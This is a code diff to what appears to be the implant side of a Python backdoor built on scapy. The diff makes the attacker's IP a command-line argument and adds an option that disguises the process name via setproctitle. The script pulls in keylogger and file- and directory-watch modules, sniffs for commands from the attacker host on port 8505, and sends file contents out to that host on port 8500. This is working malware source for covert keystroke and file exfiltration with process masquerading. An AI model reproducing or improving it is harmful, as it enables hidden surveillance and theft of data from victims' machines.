@@ -3,12 +3,34 @@
 
 from scapy.all import *
 from multiprocessing import Process
-import sys
+import sys, argparse, setproctitle
 import encryption as encryption
 import keylog as keylogger
 import watchfile as watchfile
 import watchdir as watchdir
 
+
+# Parse command-line arguments
+parser = argparse.ArgumentParser()
+
+parser.add_argument("-a",
+                    "--attacker",
+                    type=str,
+                    help="IP of remote attacker",
+                    required=True)
+
+parser.add_argument("-m",
+                    "--masq",
+                    type=str,
+                    help="Process name of this app, to masquerade as",
+                    required=False)      
+
+global parseargs
+parseargs = parser.parse_args()
+
+# Masquerade this app's process name, if provided
+if parseargs.masq is not None:
+    setproctitle.setproctitle(parseargs.masq)
 
 is_running = False
 process_list = []
@@ -51,7 +73,7 @@ def send_file(mode, filename, chunks):
     parts[-1] += ("$EOF" + mode)
 
     for part in parts:
-        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/part.encode("utf-8")
+        pkt = IP(dst=parseargs.attacker)/TCP(sport=RandShort(), dport=8500)/part.encode("utf-8")
         send(pkt, verbose=False)
 
 
@@ -71,7 +93,7 @@ def exec_function(mode, *args):
             is_running = True
 
             filename = args[0]
-            watchfile_process = Process(target=watchfile.start_watchfile, args=(filename,))
+            watchfile_process = Process(target=watchfile.start_watchfile, args=(filename,parseargs.attacker,))
             process_list.append(watchfile_process)
             process_list[0].start()
 
@@ -80,8 +102,7 @@ def exec_function(mode, *args):
             is_running = True
 
             dirname = args[0]
-            print(dirname)
-            watchdir_process = Process(target=watchdir.start_watchdir, args=(dirname,))
+            watchdir_process = Process(target=watchdir.start_watchdir, args=(dirname,parseargs.attacker,))
             process_list.append(watchdir_process)
             process_list[0].start()
 
@@ -122,7 +143,7 @@ def main():
     print("Listening...\n")
 
     while True:
-        sniff(filter="ip and tcp and host 192.168.1.75 and dst port 8505", prn=read_pkt)
+        sniff(filter=f"ip and tcp and host {parseargs.attacker} and dst port 8505", prn=read_pkt)
 
 
 if __name__ == "__main__":
